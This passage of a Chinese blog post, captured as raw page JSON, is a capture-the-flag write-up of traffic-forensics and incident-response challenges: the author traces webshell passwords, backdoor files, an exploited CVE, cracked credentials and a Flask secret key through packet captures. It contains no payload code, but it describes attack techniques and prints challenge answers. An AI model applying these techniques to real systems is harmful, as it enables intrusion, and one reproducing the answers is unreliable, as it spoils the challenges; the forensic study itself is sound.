class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>查看日志，由于虚拟机cat只能看一部分，所以这里就用vim来预览</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">vim <span class=\"token operator\">/</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>log<span class=\"token operator\">/</span>nginx<span class=\"token operator\">/</span>access<span class=\"token punctuation\">.</span>log<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031812594.png\" alt=\"image-20230903181213563\"></p>\n<p>发现伪造的UA</p>\n<p>最终把这两个UA合起来按要求转为md5即可</p>\n<h2 id=\"IncidentResponse-6\"><a href=\"#IncidentResponse-6\" class=\"headerlink\" title=\"IncidentResponse_6\"></a>IncidentResponse_6</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：攻击者使用了两种权限维持手段，相应的配置文件路径是？<span class=\"token punctuation\">(</span>md5加密后以a开头<span class=\"token punctuation\">)</span>（答案中如有空格均需去除，如有大写均需变为小写，使用echo <span class=\"token operator\">-</span>n 'strings'<span class=\"token operator\">|</span>md5sum<span class=\"token operator\">|</span>cut <span class=\"token operator\">-</span>d <span class=\"token char\">' '</span> <span class=\"token operator\">-</span>f1获取md5值作为答案）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在<code>root/.ssh</code>下发现存在ssh私钥</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031815514.png\" alt=\"image-20230903181534471\"></p>\n<h2 id=\"IncidentResponse-7\"><a href=\"#IncidentResponse-7\" class=\"headerlink\" title=\"IncidentResponse_7\"></a>IncidentResponse_7</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：攻击者使用了两种权限维持手段，相应的配置文件路径是？<span class=\"token punctuation\">(</span>md5加密后以b开头<span class=\"token punctuation\">)</span>（答案中如有空格均需去除，如有大写均需变为小写，使用echo <span class=\"token operator\">-</span>n 'strings'<span class=\"token operator\">|</span>md5sum<span class=\"token operator\">|</span>cut <span class=\"token operator\">-</span>d <span class=\"token char\">' '</span> <span class=\"token operator\">-</span>f1获取md5值作为答案）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>查看开机启动项</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">systemctl list<span class=\"token operator\">-</span>unit<span class=\"token operator\">-</span>files<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031828853.png\" alt=\"image-20230903182813808\"></p>\n<p>发现<code>redis.service</code>自启动，位置确定为<code>/lib/systemed/system/redis.services</code>，转换md5即可</p>\n<h1 id=\"SSW\"><a href=\"#SSW\" class=\"headerlink\" title=\"SSW\"></a>SSW</h1><h2 id=\"SmallSword-1\"><a href=\"#SmallSword-1\" class=\"headerlink\" title=\"SmallSword_1\"></a>SmallSword_1</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：连接蚁剑的正确密码是<span class=\"token constant\">______________</span><span class=\"token operator\">?</span>（答案示例：<span class=\"token number\">123</span>asd）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在143流中发现key，此即为密码</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308291413913.png\" alt=\"image-20230829141309691\"></p>\n<h2 id=\"SmallSword-2\"><a href=\"#SmallSword-2\" class=\"headerlink\" title=\"SmallSword_2\"></a>SmallSword_2</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：攻击者留存的值是<span class=\"token constant\">______________</span><span class=\"token operator\">?</span><span class=\"token punctuation\">(</span>答案示例：d1c3f0d3<span class=\"token operator\">-</span><span class=\"token number\">68</span>bb<span class=\"token operator\">-</span><span class=\"token number\">4</span>d85<span class=\"token operator\">-</span>a337<span class=\"token operator\">-</span>fb97cf99ee2e<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<p>在HTTP流中看，找到一个base64编码的</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308291424498.png\" alt=\"image-20230829142409363\"></p>\n<p>解码得<code>ad6269b7-3ce2-4ae8-b97f-f259515e7a91 </code></p>\n<h2 id=\"SmallSword-3\"><a href=\"#SmallSword-3\" class=\"headerlink\" title=\"SmallSword_3\"></a>SmallSword_3</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：攻击者下载到的flag是<span class=\"token constant\">______________</span><span class=\"token operator\">?</span><span class=\"token punctuation\">(</span>答案示例：flag3<span class=\"token punctuation\">&#123;</span>uuid<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h1 id=\"EW\"><a href=\"#EW\" class=\"headerlink\" title=\"EW\"></a>EW</h1><h2 id=\"ez-web-1\"><a href=\"#ez-web-1\" class=\"headerlink\" title=\"ez_web_1\"></a>ez_web_1</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：\n\n服务器自带的后门文件名是什么？（含文件后缀）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>追踪HTTP10062流，可以发现<code>ViewMore.php</code>写入了<code>d00r.php</code>文件</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300841911.png\" alt=\"image-20230830084118681\"></p>\n<p>因此自带的后门文件名为<code>ViewMore.php</code></p>\n<h2 id=\"ez-web-2\"><a href=\"#ez-web-2\" class=\"headerlink\" title=\"ez_web_2\"></a>ez_web_2</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：服务器的内网<span class=\"token constant\">IP</span>是多少？<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>寻找<code>d00r.php</code>文件，追踪<code>HTTP10098流</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300846275.png\" alt=\"image-20230830084635137\"></p>\n<p>得到内网IP<code>192.168.101.132</code></p>\n<h2 id=\"ez-web-3\"><a href=\"#ez-web-3\" class=\"headerlink\" title=\"ez_web_3\"></a>ez_web_3</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">题目内容：攻击者往服务器中写入的key是什么？<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里发现写入了内容</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300849183.png\" alt=\"image-20230830084935094\"></p>\n<p>Base64解码可以看出为压缩包格式</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300851759.png\" alt=\"image-20230830085112706\"></p>\n<p>打开压缩包</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300853055.png\" alt=\"image-20230830085343895\"></p>\n<p>需要密码，从上文可得到密码</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300854415.png\" alt=\"image-20230830085415373\"></p>\n<p>输入后得到<code>key</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202308300854469.png\" alt=\"image-20230830085445390\"></p>\n<h1 id=\"TP\"><a href=\"#TP\" class=\"headerlink\" title=\"TP\"></a>TP</h1><h2 id=\"tcp-dump1\"><a href=\"#tcp-dump1\" class=\"headerlink\" title=\"tcp_dump1\"></a>tcp_dump1</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：攻击者通过暴力破解进入了某<span class=\"token class-name\">Wiki</span> 文档，请给出登录的用户名与密码，以<span class=\"token operator\">:</span>拼接，比如admin<span class=\"token operator\">:</span>admin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<p>之前穷举挨个看的，现在学习其他师傅的思路，语法如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">http <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>http<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>uri contains <span class=\"token string\">\"login\"</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>tcp contains <span class=\"token string\">\"用户名或密码错误\"</span> <span class=\"token operator\">&amp;&amp;</span> http<span class=\"token punctuation\">.</span>response<span class=\"token punctuation\">.</span>code <span class=\"token operator\">!=</span><span class=\"token number\">404</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里的话是筛除了<code>login</code>登录包和报错包以及返回404的包，剩下的就是一些无报错信息，且不是登录包的流量，而登录成功的那个包也肯定在这里，因此接下来找一下就好了</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031441719.png\" alt=\"image-20230903144120506\"></p>\n<p>跟进TCP流</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031441267.png\" alt=\"image-20230903144139182\"></p>\n<p>账密<code>TMjpxFGQwD:123457</code></p>\n<h2 id=\"tcp-dump2\"><a href=\"#tcp-dump2\" class=\"headerlink\" title=\"tcp_dump2\"></a>tcp_dump2</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：攻击者发现软件存在越权漏洞，请给出攻击者越权使用的cookie的内容的md5值。（<span class=\"token number\">32</span>位小写）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031446452.png\" alt=\"image-20230903144602338\"></p>\n<p>注意到<code>userid</code>为2，再往下看</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031446916.png\" alt=\"image-20230903144632790\"></p>\n<p><code>userid</code>变为1了，将Cookie值内容进行md5加密</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token number\">383</span>c74db4e32513daaa1eeb1726d7255<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>所以此时就得到了flag</p>\n<h2 id=\"tcp-dump3\"><a href=\"#tcp-dump3\" class=\"headerlink\" title=\"tcp_dump3\"></a>tcp_dump3</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">攻击使用jdbc漏洞读取了应用配置文件，给出配置中的数据库账号密码，以<span class=\"token operator\">:</span>拼接，比如root<span class=\"token operator\">:</span><span class=\"token number\">123456</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>TCP流追踪1601</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031502284.png\" alt=\"image-20230903150239151\"></p>\n<p>得到数据库账密<code>zyplayer:1234567</code></p>\n<h2 id=\"tcp-dump4\"><a href=\"#tcp-dump4\" class=\"headerlink\" title=\"tcp_dump4\"></a>tcp_dump4</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：攻击者又使用了CVE漏洞攻击应用，执行系统命令，请给出此CVE编号以及远程EXP的文件名，使用<span class=\"token operator\">:</span>拼接，比如CVE<span class=\"token operator\">-</span><span class=\"token number\">2020</span><span class=\"token operator\">-</span><span class=\"token number\">19817</span><span class=\"token operator\">:</span>exp<span class=\"token punctuation\">.</span>so<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在TCP流中发现是<code>postgresql</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031504611.png\" alt=\"image-20230903150436483\"></p>\n<p>百度一下它的RCE漏洞</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031505750.png\" alt=\"image-20230903150500686\"></p>\n<p>得到CVE编号为<code>CVE-2022-21724</code>,追踪下一个流量包</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031506689.png\" alt=\"image-20230903150606582\"></p>\n<p>发现文件名是<code>custom.dtd.xml</code>，因此flag为<code>CVE-2022-21724:custom.dtd.xml</code></p>\n<h2 id=\"tcp-dump5\"><a href=\"#tcp-dump5\" class=\"headerlink\" title=\"tcp_dump5\"></a>tcp_dump5</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：给出攻击者获取系统权限后，下载的工具的名称，比如nmap<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>跟踪TCP流1611</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031508792.png\" alt=\"image-20230903150844687\"></p>\n<p>发现内网扫描工具<code>fscan</code></p>\n<h1 id=\"HD\"><a href=\"#HD\" class=\"headerlink\" title=\"HD\"></a>HD</h1><h2 id=\"hacked-1\"><a href=\"#hacked-1\" class=\"headerlink\" title=\"hacked_1\"></a>hacked_1</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：admIn用户的密码是什么？<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>发现加密的<code>key</code>和<code>iv</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031515569.png\" alt=\"image-20230903151520457\"></p>\n<p>而后发现密码</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031522804.png\" alt=\"image-20230903152245703\"></p>\n<p>解密即可</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031617005.png\" alt=\"image-20230903161758903\"></p>\n<p>flag<code>flag&#123;WelC0m5_TO_H3re&#125;</code></p>\n<h2 id=\"hacked-2\"><a href=\"#hacked-2\" class=\"headerlink\" title=\"hacked_2\"></a>hacked_2</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：app<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">[</span>'SECRET_KEY'<span class=\"token punctuation\">]</span>值为多少？<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031629627.png\" alt=\"image-20230903162922516\"></p>\n<p>用在线工具解码一下即可得到key</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031629257.png\" alt=\"image-20230903162901040\"></p>\n<p>所以key为<code>ssti_flask_hsfvaldb</code></p>\n<h2 id=\"hacked-3\"><a href=\"#hacked-3\" class=\"headerlink\" title=\"hacked_3\"></a>hacked_3</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：flask网站由哪个用户启动？<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>TCP76流</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031636677.png\" alt=\"image-20230903163616585\"></p>\n<p>Cookie如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token punctuation\">.</span>eJwdx1EKwyAMANCrDEGiPz1Ar1KGZBi7gBpplH2Idy_d<span class=\"token operator\">-</span><span class=\"token number\">3</span>vTDKWrYiGzm2k5vZRUWeo2WsRObkLKeMKeuekoB4RwZvlg1hDg_S917lSeOhAFf0CTRvXp7ytYGPx2EUbnl7drWqqRk11m3cGmKw0<span class=\"token punctuation\">.</span>YpIQcw<span class=\"token punctuation\">.</span>J5vs8t8bAr0xDIxF6EqUAH2kkLE<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>结合上文得到的密钥，用工具即可</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031645537.png\" alt=\"image-20230903164512493\"></p>\n<p>得到用户为<code>red</code></p>\n<h2 id=\"hacked-4\"><a href=\"#hacked-4\" class=\"headerlink\" title=\"hacked_4\"></a>hacked_4</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">题目内容：攻击者写入的内存马的路由名叫什么？（答案里不需要加<span class=\"token operator\">/</span>）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>TCP82流之前没被请求过，所以猜测是<code>Index</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309031647941.png\" alt=\"image-20230903164737855\"></p>\n","feature":true,"text":"HWhard_web_1题目内容： 服务器开放了哪些端口，请按照端口大小顺序提交答案，并以英文逗号隔开(如服务器开放了80 81 82 83端口，则答案为80,81,82,83) 下载附件后，点击分析中的专家信息 然后选择Chat，可以发现 开放端口为80,8888,888 ha...","link":"","photos":[],"count_time":{"symbolsCount":"6.8k","symbolsTime":"6 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"CTF","slug":"CTF","count":4,"path":"api/tags/CTF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#HW\"><span class=\"toc-text\">HW</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#hard-web-1\"><span class=\"toc-text\">hard_web_1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#hard-web-2\"><span class=\"toc-text\">hard_web_2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#hard-web-3\"><span class=\"toc-text\">hard_web_3</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SS\"><span class=\"toc-text\">SS</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sevrer-save-1\"><span class=\"toc-text\">sevrer save_1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sevrer-save-2\"><span class=\"toc-text\">sevrer save_2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sevrer-save-3\"><span class=\"toc-text\">sevrer save_3</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sevrer-save-4\"><span class=\"toc-text\">sevrer save_4</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sevrer-save-5\"><span class=\"toc-text\">sevrer save_5</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sevrer-save-6\"><span class=\"toc-text\">sevrer save_6</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sevrer-save-7\"><span class=\"toc-text\">sevrer save_7</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sevrer-save-8\"><span class=\"toc-text\">sevrer save_8</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#WS\"><span class=\"toc-text\">WS</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Wireshark1-1\"><span class=\"toc-text\">Wireshark1_1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Wireshark1-2\"><span class=\"toc-text\">Wireshark1_2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Wireshark1-3\"><span class=\"toc-text\">Wireshark1_3</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Wireshark1-4\"><span class=\"toc-text\">Wireshark1_4</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#IR\"><span class=\"toc-text\">IR</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#IncidentResponse-1\"><span class=\"toc-text\">IncidentResponse_1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#IncidentResponse-2\"><span class=\"toc-text\">IncidentResponse_2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#IncidentResponse-3\"><span class=\"toc-text\">IncidentResponse_3</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#IncidentResponse-4\"><span class=\"toc-text\">IncidentResponse_4</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#IncidentResponse-5\"><span class=\"toc-text\">IncidentResponse_5</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#IncidentResponse-6\"><span class=\"toc-text\">IncidentResponse_6</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#IncidentResponse-7\"><span class=\"toc-text\">IncidentResponse_7</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SSW\"><span class=\"toc-text\">SSW</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SmallSword-1\"><span class=\"toc-text\">SmallSword_1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SmallSword-2\"><span class=\"toc-text\">SmallSword_2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SmallSword-3\"><span class=\"toc-text\">SmallSword_3</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#EW\"><span class=\"toc-text\">EW</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ez-web-1\"><span class=\"toc-text\">ez_web_1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ez-web-2\"><span class=\"toc-text\">ez_web_2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ez-web-3\"><span class=\"toc-text\">ez_web_3</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#TP\"><span class=\"toc-text\">TP</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#tcp-dump1\"><span class=\"toc-text\">tcp_dump1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#tcp-dump2\"><span class=\"toc-text\">tcp_dump2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#tcp-dump3\"><span class=\"toc-text\">tcp_dump3</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#tcp-dump4\"><span class=\"toc-text\">tcp_dump4</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#tcp-dump5\"><span class=\"toc-text\">tcp_dump5</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#HD\"><span class=\"toc-text\">HD</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#hacked-1\"><span class=\"toc-text\">hacked_1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#hacked-2\"><span class=\"toc-text\">hacked_2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#hacked-3\"><span class=\"toc-text\">hacked_3</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#hacked-4\"><span class=\"toc-text\">hacked_4</span></a></li></ol></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"内网渗透|域环境搭建","uid":"6690abdbc95c357e7775125250f59948","slug":"域环境搭建","date":"2023-09-11T17:40:20.000Z","updated":"2024-02-14T07:48:32.000Z","comments":true,"path":"api/articles/域环境搭建.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202310112308219.png","text":"域内环境搭建安装域控这里要选带有GUI的服务器，不然就只有CMD命令行，没有图形化界面 之后持续下一步和同意即可至开机界面。 我们要做的事情如下 1、分配IP 2、更改计算机名 3、安装域控制器和DNS服务器 4、升级服务器 5、创建Active Directory用户 接下首先...","link":"","photos":[],"count_time":{"symbolsCount":"1.2k","symbolsTime":"1 mins."},"categories":[{"name":"内网","slug":"内网","count":12,"path":"api/categories/内网.json"}],"tags":[{"name":"内网","slug":"内网","count":13,"path":"api/tags/内网.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"JAVA CC链全系列分析","uid":"cb7c14b5ba1b8885cf6dda7d25b703e1","slug":"CC2+CC4+CC5+CC7","date":"2023-08-31T16:51:30.000Z","updated":"2024-01-11T10:08:44.000Z","comments":true,"path":"api/articles/CC2+CC4+CC5+CC7.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309032056277.jpeg","text":" 4630436162ade97ba2718b7d0c4b3b63cb3a3f659c5ca08b4bca0f5845928186064b7773ff3265dc3ff8dd708b2e21ad11f5301e5aa66485462a3b6b5e978f5ecf4f45a249f...","link":"","photos":[],"count_time":{"symbolsCount":"553k","symbolsTime":"8:23"},"categories":[{"name":"JAVA","slug":"JAVA","count":10,"path":"api/categories/JAVA.json"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","count":6,"path":"api/tags/JAVA安全.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}